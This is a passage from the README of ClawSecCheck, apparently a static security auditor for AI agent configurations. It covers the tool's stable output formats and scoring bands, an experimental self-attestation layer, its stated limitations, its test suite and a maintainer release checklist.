- **CLI flags** and their documented meaning (`--json`, `--sarif`, `--card`, `--monitor`,
  `--fail-under`, `--exit-code`, …).
- **`--json` schema:** top-level `score`, `grade`, `capped`, `raw_score`, `trifecta`,
  `findings[]`, `next_actions[]`; each finding's `id`, `title`, `severity`, `status`, `detail`,
  `fix`, `framework`, `confidence`, `evidence`.
- **SARIF 2.1.0 output** shape (rule ids = check ids; `properties.confidence` + `.evidence`).
- **Public Python API:** `clawseccheck.audit(...) -> (ctx, findings, ScoreResult)` and the
  `Finding` field names.
- **Check IDs** (full generated catalog in [`docs/CHECKS.md`](docs/CHECKS.md)): an id, once shipped, keeps its meaning.
- **Status / confidence vocabularies:** `PASS|WARN|FAIL|UNKNOWN`, `HIGH|MEDIUM|LOW|ATTESTED`.
- **Scoring bands:** A 90+ · B 80–89 · C 70–79 · D 50–69 · F <50; `UNKNOWN` never scores; advisory
  checks (`scored=False`) never move the grade.

**Explicitly experimental within 1.x (may change without a major bump, by design):**

- The **attestation layer**: the `clawseccheck-attest/1` self-report schema (note the `/1` — it is
  explicitly versioned to evolve), the `--ask`/`--attest` flow, the B43 **verb→blast-radius
  taxonomy**, and B44. The `ATTESTED` confidence tier exists to mark exactly this: a self-report is
  weaker than a config fact, advisory, and never overrides one. Freezing the newest surface now
  would over-commit, so it stays flexible under this label until it has had broader real-world use.

---

## ⚖️ Limitations

- **Heuristic local audit, not a formal proof of safety.** ClawSecCheck inspects
  configuration text and known patterns; it cannot reason about all possible runtime
  behaviours or formally verify your agent's security properties.
- **Does not replace runtime red-teaming.** Static configuration analysis is a starting
  point, not a substitute for adversarial testing against a running agent.
- **May produce false positives and false negatives.** Evidence-gating keeps noise low,
  but heuristics can miss novel attack patterns and can misread edge-case configurations.
- **Read scope is bounded:** config, bootstrap markdown, installed-skill text, OpenClaw log
  files, agent session logs, host OS path-existence checks, and credential-store path presence
  — not an exhaustive scan of your filesystem, and credential-store contents are never read.
- **UNKNOWN is not PASS.** Unreadable files or unparseable configs are reported as
  UNKNOWN and excluded from the score, never silently marked safe.

---

## 🧪 Tests

A security tool should be heavily tested — so it is. The suite is **140+ test files / 2,400+ tests**, run on **Python 3.9 and 3.12** in CI alongside `ruff`. Tests are **offline and read-only** (no network, nothing written outside the test's temp dir); every check ships a **clean fixture** (no finding) *and* a **bad fixture** (the finding fires) plus explicit `UNKNOWN`-path coverage; and the release bar is **zero false-positive FAILs on real configs**.

```bash
python3 -m pytest -q       # full suite
ruff check .               # lint
```

The test suite and fixtures live in the [GitHub repo](https://github.com/gl0di/clawseccheck) — they are not bundled in the installed skill package.

---

## 📄 License

MIT — see [LICENSE](LICENSE).

## Release protocol (maintainers)

Before merging a release, follow this checklist:

### 1) Tests before release

- `python3 -m ruff check .`
- `python3 -m pytest`
- Run the most relevant test subset for the touched area if the full suite is too large for your CI window.

### 2) Documentation and protocol alignment

Update all of the following files (in order):

- `CHANGELOG.md`
- `README.md`
- `SECURITY.md`
- `SECURITY_MODEL.md`
- `SKILL.md`

### 3) Dependabot — merge open PRs

- `gh pr list --author app/dependabot` — merge all open dependabot PRs before tagging.

### 4) Pre-release review gate

- Re-read the release notes and verify that check IDs, remediation text, and examples match the implemented code/tests.
